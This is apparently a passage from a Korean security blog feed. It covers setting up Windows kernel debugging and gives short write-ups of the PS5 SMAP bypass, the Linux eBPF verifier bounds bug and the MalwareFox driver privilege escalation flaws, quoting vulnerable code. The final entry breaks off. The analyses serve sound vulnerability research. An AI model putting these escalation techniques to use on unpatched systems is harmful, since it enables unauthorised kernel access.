&#xB514;&#xBC84;&#xAE45;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; &#xD544;&#xC694;&#xD55C; &#xC900;&#xBE44;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>1. &#xD638;&#xC2A4;&#xD2B8; Windows&#xC640; VMware or Hyper-V&#xC758; &#xAC8C;&#xC2A4;&#xD2B8; Windows</strong></p><p>Windbg&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xCEE4;&#xB110;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBD84;&#xC11D;&#xB300;&#xC0C1;&#xC774; &#xB418;&#xB294; &#xB514;&#xBC84;&#xAE30; Windows&#xC640; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD560; Windows&#xAC00; &#xAC01;&#xAC01; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xD638;&#xC2A4;&#xD2B8;&#xAC00; Windows &#xD658;&#xACBD;&#xC774;&#xBA74; &#xAC8C;&#xC2A4;&#xD2B8; Windows VM &#xD558;&#xB098;&#xB9CC; &#xC62C;&#xB9AC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip.png" alt="windows-driver/tempsnip.png"></p><blockquote><p>?</p></blockquote><p>&#xB124; &#xC800;&#xB294; &#xB9E5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;&#x2026;..  Windows VM &#xB450;&#xAC1C;&#xB97C; &#xC62C;&#xB824;&#xC11C; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB124;? &#xC5B4;&#xB514;&#xC11C; &#xBB50;&#xAC00; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xC18C;&#xB9AC; &#xC548;&#xB098;&#xB0D0;&#xAD6C;&#xC694;?</p><p>.</p><p>.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%204.png" alt="windows-driver/Untitled%204.png"></p><blockquote><p>&#xC774;&#xB959;&#xD55C;&#xB4DC;&#xC544;&#xC544;&#x314F;&#x314F; !!!</p></blockquote><p>&#xB9E5;&#xC774; &#xC798; &#xBC84;&#xD168;&#xC8FC;&#xACE0; &#xC788;&#xC73C;&#xB2C8; &#xB2E4;&#xD589;&#xC774;&#xB124;&#xC694; &#x314E;&#x314E; &#xC544;&#xB2D8;&#xB9D0;&#xACE0;<br>&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xD3B8;&#xC758;&#xC0C1; &#xD638;&#xC2A4;&#xD2B8; OS&#xAC00; Windows&#xB77C;&#xACE0; &#xAC00;&#xC815;&#xD558;&#xACE0; &#xBD84;&#xC11D;&#xD560; &#xB514;&#xBC84;&#xAE30; Windows&#xB97C; &#xAC8C;&#xC2A4;&#xD2B8;&#xB77C;&#xACE0; &#xBD80;&#xB974;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p><strong>2. &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0;&#xC744; &#xCE5C;&#xAD6C;&#xCC98;&#xB7FC; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xAC15;&#xC778;&#xD55C; &#xBA58;&#xD0C8;(?)</strong></p><p>&#xC0AC;&#xC2E4; &#xCDE8;&#xC57D;&#xC810; &#xCC3E;&#xB294; &#xC785;&#xC7A5;&#xC5D0;&#xC11C; &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0;&#xC740; &#xACE7; &#xD06C;&#xB798;&#xC2DC;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBE14;&#xB8E8;&#xC2A4;&#xD06C;&#xB9B0;&#xC744; &#xBCF8;&#xB2E4;&#xBA74; &#xAC1C;&#xC774;&#xB4DD;&#xC774;&#xC8E0;&#x314B;&#x314B;  </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%205.png" alt="windows-driver/Untitled%205.png"></p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%206.png" alt="windows-driver/Untitled%206.png"></p><blockquote><p>&#xD3B8;&#xC548;-</p></blockquote><p>&#xBA58;&#xD0C8;&#xAE4C;&#xC9C0; &#xC900;&#xBE44;&#xAC00; &#xBAA8;&#xB450; &#xB418;&#xC5C8;&#xB2E4;? &#xBC14;&#xB85C; &#xB514;&#xBC84;&#xAE45; &#xC138;&#xD305;&#xC73C;&#xB85C; &#xACE0;&#xACE0;&#xACE0;</p><h1 id="Setting-Up-Debugging"><a href="#Setting-Up-Debugging" class="headerlink" title="Setting Up Debugging"></a>Setting Up Debugging</h1><p>&#xBA3C;&#xC800; &#xAC8C;&#xC2A4;&#xD2B8;&#xC640; &#xD638;&#xC2A4;&#xD2B8; Windows&#xC5D0; <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/debugger/debugger-download-tools">Windbg</a>&#xB97C; &#xC124;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;. &#xD638;&#xC2A4;&#xD2B8; Windows&#xC5D0;&#xB294; Windbg Preview&#xB97C; &#xC124;&#xCE58;&#xD574; &#xC0AC;&#xC6A9;&#xD574;&#xB3C4; &#xB418;&#xC9C0;&#xB9CC; Windbg Preview&#xB294; kdnet&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC8C;&#xC2A4;&#xD2B8; Windows&#xC5D0;&#xB294; Windbg&#xB97C; SDK&#xB85C; &#xC124;&#xCE58;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip%201.png" alt="windows-driver/tempsnip%201.png"></p><p>Windbg &#xC124;&#xCE58;&#xB97C; &#xB05D;&#xB0C8;&#xC73C;&#xBA74; &#xAC8C;&#xC2A4;&#xD2B8; VM &#xC124;&#xC815;&#x2192;Network Adapter&#xC5D0;&#xC11C; Network connection&#xC744; Bridged&#xB85C; &#xC124;&#xC815;&#xD574; &#xD638;&#xC2A4;&#xD2B8;&#xC640; &#xD1B5;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xC124;&#xC815;&#xD55C; &#xB4A4; &#xD1B5;&#xC2E0;&#xC774; &#xC798; &#xB418;&#xB294;&#xC9C0; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBD05;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%207.png" alt="windows-driver/Untitled%207.png"></p><p>&#xD551; &#xD14C;&#xC2A4;&#xD2B8; &#xD560; &#xB54C;&#xB294; &#xD638;&#xC2A4;&#xD2B8;&#xC640; &#xAC8C;&#xC2A4;&#xD2B8; &#xBAA8;&#xB450; &#xBC29;&#xD654;&#xBCBD;&#xC5D0;&#xC11C; ICMP &#xC778;&#xBC14;&#xC6B4;&#xB4DC; &#xD5C8;&#xC6A9;&#xD558;&#xB294; &#xAC83; &#xC78A;&#xC9C0; &#xB9C8;&#xC138;&#xC694;!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%208.png" alt="windows-driver/Untitled%208.png"></p><p>&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD1B5;&#xC2E0;&#xC774; &#xB418;&#xB294; &#xAC78; &#xD655;&#xC778;&#xD588;&#xC73C;&#xBA74; &#xD638;&#xC2A4;&#xD2B8;&#xC758; host name&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%209.png" alt="windows-driver/Untitled%209.png"></p><p>&#xAC8C;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; cmd&#xB97C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD574; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; <code>kdnet.exe</code>&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xD3EC;&#xD2B8;&#xB294; 50000 ~ 50039 &#xBC94;&#xC704; &#xC548;&#xC5D0;&#xC11C; &#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs angelscript">&gt; kdnet.exe &lt;host name&gt; <span class="hljs-number">50001</span></code></pre><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2010.png" alt="windows-driver/Untitled%2010.png"></p><p>&#xD574;&#xB2F9; &#xBA38;&#xC2E0;&#xC744; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xAE30; &#xC704;&#xD574; &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xD638;&#xC2A4;&#xD2B8; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xB77C;&#xACE0; &#xD558;&#xB124;&#xC694;! &#xBE68;&#xAC04; &#xBC15;&#xC2A4;&#xC758; &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xBCF5;&#xC0AC;&#xD574;&#xB193;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; &#xD638;&#xC2A4;&#xD2B8;&#xC758; Windbg Preview&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; Start debugging &#x2192; Attach to Kernel &#x2192; Net &#xC5D0;&#xC11C; &#xD3EC;&#xD2B8;&#xC640; &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xC785;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2011.png" alt="windows-driver/Untitled%2011.png"></p><p>OK&#xB97C; &#xB20C;&#xB7EC; Windbg Preview&#xAC00; &#xB300;&#xAE30; &#xC0C1;&#xD0DC;&#xAC00; &#xB418;&#xBA74; &#xAC8C;&#xC2A4;&#xD2B8;&#xB97C; <code>shutdown -r -t 0</code> &#xC73C;&#xB85C; &#xC7AC;&#xBD80;&#xD305;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. </p><p>&#xC7AC;&#xBD80;&#xD305;&#xD558;&#xBA74;..!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2012.png" alt="windows-driver/Untitled%2012.png"></p><p>&#xC798; &#xBD99;&#xC740; &#xAC83; &#xAC19;&#xC8E0;? &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC778; &#xAC8C;&#xC2A4;&#xD2B8; Windows&#xB3C4; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2013.png" alt="windows-driver/Untitled%2013.png"></p><p>&#xB514;&#xBC84;&#xAC70;&#xAC00; &#xBD99;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xBD80;&#xD305;&#xB418;&#xBA74; &#xC6B0;&#xCE21; &#xD558;&#xB2E8;&#xC5D0; &#xD14C;&#xC2A4;&#xD2B8; &#xBAA8;&#xB4DC;&#xC640; &#xBE4C;&#xB4DC; &#xBC84;&#xC804; &#xC815;&#xBCF4;&#xAC00; &#xD45C;&#xC2DC;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xBD80;&#xD130;&#xB294; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; Windows&#xC758; third-party driver&#xC640; &#xCDE8;&#xC57D;&#xC810;, one-day &#xBD84;&#xC11D;&#xAE4C;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>windows driver</tag>
      
      <tag>third-party driver exploitation</tag>
      
      <tag>debugging</tag>
      
      <tag>kernel debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-29628 : PlayStation5 SMAP Bypass</title>
    <link href="/2021/05/30/j0ker/2021-05-30/"/>
    <url>/2021/05/30/j0ker/2021-05-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1048322">SMAP bypass(PS5)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>PlayStation5, FreeBSD 12</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>SMAP(Supervisor-Mode Access Prevention)&#xC740; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xC720;&#xC800;&#xB79C;&#xB4DC; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xD558;&#xC5EC; &#xCDE8;&#xC57D;&#xC810; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC5B4;&#xB835;&#xAC8C; &#xD558;&#xB294; &#xCEE4;&#xB110; &#xB808;&#xBCA8; &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><p>PlayStation 5(&#xC774;&#xD558; PS5)&#xB294; FreeBSD 12 &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xAC1C;&#xBC1C;&#xB41C; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC778; Orbis 2.0&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. CVE-2021-29628&#xC740; FreeBSD 12&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB410;&#xC5C8;&#xB358; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC9C0;&#xB9CC;, PS5&#xC5D0;&#xC11C; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xD328;&#xCE58;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC544; PS5&#xC5D0;&#xC11C; SMAP&#xB97C; bypass&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>PS5&#xC5D0;&#xC11C; SMAP&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xC0C1;&#xD0DC;(<code>Rflags</code>&#xC758; <code>Alignment Check Flag</code>, <code>%RFLAGS.AC</code>&#xAC00; &#xC138;&#xD305;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;)&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xC720;&#xC800; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74; page fault&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xBC18;&#xBA74;&#xC5D0; <code>%RFLAGS.AC</code>&#xAC00; &#xC138;&#xD305;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C;&#xB294; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC720;&#xC800; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; FreeBSD &#xCEE4;&#xB110;&#xC5D0;&#xC11C;&#xB294; <code>copyin()</code>&#xACFC; <code>copyout()</code> &#xD568;&#xC218;&#xB4E4;&#xC744; &#xD1B5;&#xD574; <code>%RFLAGS.AC</code>&#xB97C; &#xC7A0;&#xC2DC; &#xC138;&#xD305;&#xD574;&#xC11C; &#xC720;&#xC800; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs wasm">.macroCOPYIN smap erms/* ... */movq$copy_fault,PCB_ONFAULT(%r11)/* ... */stac // set %RFLAGS.AC, to allow access to user pagesdo_the_copyinclac // clear %RFLAGS.AC, to forbid access to user pages/* ... */copy_fault:movq$0,PCB_ONFAULT(%r11)movl$EFAULT,%eaxPOP_FRAME_POINTERret</code></pre><p><code>copyin()</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; fault handler&#xC778; <code>copy_fault()</code> &#xD568;&#xC218;&#xB97C; handler&#xB85C; &#xB4F1;&#xB85D;&#xD55C; &#xD6C4; <code>%RFLAGS.AC</code>&#xB97C; &#xC138;&#xD305;&#xD574; &#xBCF5;&#xC0AC; &#xC791;&#xC5C5;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xBCF5;&#xC0AC; &#xC791;&#xC5C5;&#xC774; &#xB05D;&#xB098;&#xBA74; &#xB2E4;&#xC2DC; <code>%RFLAGS.AC</code>&#xB97C; &#xD074;&#xB9AC;&#xC5B4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;, &#xBCF5;&#xC0AC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; fault&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; <code>trap()</code>&#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>trap(struct trapframe *frame){<span class="hljs-comment">/* ... */</span><span class="hljs-keyword">if</span> (curpcb-&gt;pcb_onfault != <span class="hljs-literal">NULL</span>) {frame-&gt;tf_rip = (<span class="hljs-keyword">long</span>)curpcb-&gt;pcb_onfault;<span class="hljs-keyword">return</span>;}<span class="hljs-comment">/* ... */</span>}</code></pre><p><code>trap()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>curpcb-&gt;pcb_onfault</code>&#xC5D0; &#xAC12;&#xC774; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xC73C;&#xBA74; &#xC774; &#xC548;&#xC5D0; &#xAC12;&#xC744; <code>fram&#x2192;tf_rip</code>&#xC5D0; &#xB123;&#xACE0; &#xBC14;&#xB85C; return &#xD558;&#xB294;&#xB370;, &#xC774; &#xB54C; <code>%RFLAGS.AC</code>&#xB97C; &#xD074;&#xB9AC;&#xC5B4;&#xD558;&#xC9C0; &#xC54A;&#xC544; SMAP&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xC778; &#xC0C1;&#xD0DC;&#xB85C; &#xD578;&#xB4E4;&#xB9C1;&#xC744; &#xB9C8;&#xBB34;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC774;&#xB97C; &#xD1B5;&#xD574; SMAP&#xB97C; bypass&#xD558;&#xC5EC; &#xC774; &#xC774;&#xD6C4;&#xC758; syscall&#xB4E4;&#xC744; SMAP&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bypass</tag>
      
      <tag>j0ker</tag>
      
      <tag>smap</tag>
      
      <tag>freebsd</tag>
      
      <tag>playstation5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31440: Linux Kernel eBPF verifier, incorrect bound check</title>
    <link href="/2021/05/29/fabu1ous/2021-05-29/"/>
    <url>/2021/05/29/fabu1ous/2021-05-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021-31440-an-incorrect-bounds-calculation-in-the-linux-kernel-ebpf-verifier">CVE-2021-31440: AN INCORRECT BOUNDS CALCULATION IN THE LINUX KERNEL EBPF VERIFIER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 5.7 ~ Linux kernel 5.11.15</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>eBPF&#xB294; &#xB7F0;&#xD0C0;&#xC784; &#xC911; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xCEE4;&#xB110; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xAE30; &#xC704;&#xD574; Verifier&#xC640; BPF instruction&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. Verifier&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xAC12;&#xC758; &#xBCC0;&#xD654;&#xC640; &#xADF8; &#xAC12;&#xB4E4;&#xC758; &#xD5C8;&#xC6A9; &#xBC94;&#xC704;(&#xC774;&#xD558; range)&#xB4F1;&#xC744; &#xCD94;&#xC801;&#xD574; memory load&#xC640; store&#xC758; out-of-bound &#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. CVE-2021-31440&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; out-of-bound &#xAC80;&#xC0AC;&#xB97C; &#xBB34;&#xB825;&#xD654;&#xD558;&#xACE0; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xB178;&#xB9B4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">...    <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umin_value))             reg-&gt;u32_min_value = (u32)reg-&gt;umin_value;     <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umax_value))             reg-&gt;u32_max_value = (u32)reg-&gt;umax_value;...</code></pre><p>&#xC704;&#xB294; &#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC; &#xBD80;&#xBD84;&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. &#xAE30;&#xC874; eBPF &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; CVE-2021-31440 &#xB610;&#xD55C; 64 bit range&#xC758; &#xD558;&#xC704; 32 &#xBE44;&#xD2B8;&#xB85C;&#xBD80;&#xD130; 32 bit range&#xB97C; &#xB3C4;&#xCD9C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC84;&#xADF8;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>umin_value</code>&#xAC00; 1, <code>umax_value</code> &#xAC00; 1&lt;&lt;32&#xC774;&#xB77C; &#xD560; &#xB54C; <code>u32_min_value</code>&#xB294; 1, <code>u32_max_value</code>&#xB294; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xACE0; &#xC2E4;&#xC81C; runtime range&#xC640; &#xB2E4;&#xB978; &#xAC12;&#xC744; Verifier&#xC5D0;&#xAC8C; &#xC804;&#xB2EC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>Verifier&#xB294; &#xC798;&#xBABB;&#xB41C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xD5C8;&#xC6A9;&#xBC94;&#xC704;&#xB97C; &#xAC16;&#xAC8C; &#xB418;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; out-of-bound read/write access&#xAC00; &#xAC00;&#xB2A5;&#xD574; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>oob</tag>
      
      <tag>lpe</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>Fabu1ous</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31727/31728: MalwareFox AntiMalware 로컬 권한상승 취약점</title>
    <link href="/2021/05/28/l0ch/2021-05-28/"/>
    <url>/2021/05/28/l0ch/2021-05-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irql0/CVE-2021-31728">CVE-2021-31728</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MalwareFox AntiMalware 2.74.0.150</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC778; MalwareFox&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4; &#xBC0F; PoC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xAC1C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB450; &#xAC00;&#xC9C0;&#xB85C;, &#xBAA8;&#xB450; MalwareFox&#xC758; <code>zam64.sys</code> &#xBC0F; <code>zam32.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><h3 id="CVE-2021-31727"><a href="#CVE-2021-31727" class="headerlink" title="CVE-2021-31727"></a>CVE-2021-31727</h3><p><code>zam64.sys</code>/<code>zam32.sys</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; IOCTL <code>0x80002014</code> &#xBC0F; <code>0x80002018</code> &#xC740; unrestricted disk read/write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xBD80;&#xD2B8; &#xC139;&#xD130;&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xAC70;&#xB098; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="CVE-2021-31728"><a href="#CVE-2021-31728" class="headerlink" title="CVE-2021-31728"></a>CVE-2021-31728</h3><p>IOCTL <code>0x80002040</code>&#xC740; UserBuffer&#xC5D0;&#xC11C; &#xBCF5;&#xC0AC;&#xB418;&#xB294; &#xB300;&#xC0C1; &#xBC84;&#xD37C;&#xC778; NonPagedPool&#xC5D0;&#xC11C; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xBA70; &#xC785;&#xB825; &#xBC84;&#xD37C;&#xAC00; <code>0x1000</code> bytes&#xBCF4;&#xB2E4; &#xCEE4; &#xC258;&#xCF54;&#xB4DC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. IOCTL <code>0x80002018</code> &#xC740; miniport &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; IRP_MJ_SCSI_HANDLER&#xC5D0; &#xB300;&#xD55C; &#xD568;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC5D0; &#xC758;&#xD574; &#xC9C0;&#xC815;&#xB41C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; SCSI &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC544;&#xB798; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xB4DC;&#xB77C;&#xC774;&#xBC84; 